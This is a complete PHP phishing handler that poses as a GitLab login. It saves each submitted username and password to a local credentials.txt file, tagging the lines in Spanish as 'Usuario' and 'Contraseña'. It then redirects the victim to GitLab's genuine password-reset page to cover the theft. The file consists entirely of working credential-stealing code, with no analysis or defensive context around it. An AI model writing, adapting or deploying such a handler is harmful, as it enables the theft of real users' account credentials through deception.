<?php

file_put_contents("credentials.txt", "[+] Gitlab -> Usuario: " . $_POST['login'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://gitlab.com/users/password/new');
exit();
?>
